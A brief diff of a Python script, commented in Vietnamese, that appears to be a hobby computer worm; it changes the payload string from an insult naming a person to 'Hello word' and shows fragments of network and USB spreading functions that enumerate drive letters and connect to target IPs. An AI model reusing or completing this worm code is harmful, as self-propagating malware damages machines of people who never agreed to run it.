@@ -5,7 +5,7 @@ import time
 import shutil
 
 # Tải trọng của sâu máy tính
-payload = "Cẩm Hà là kẻ ngốc!"
+payload = "Hello word"
 
 # Hàm lây lan qua mạng
 def spread_network():
@@ -22,7 +22,6 @@ def spread_network():
         except Exception as e:
             print(f"Không thể kết nối tới {target_ip}: {e}")
 
-# Hàm lây lan qua USB
 def spread_usb():
     drives = [f"{chr(drive)}:/" for drive in range(65, 91) if os.path.exists(f"{chr(drive)}:/")]
     for drive in drives:
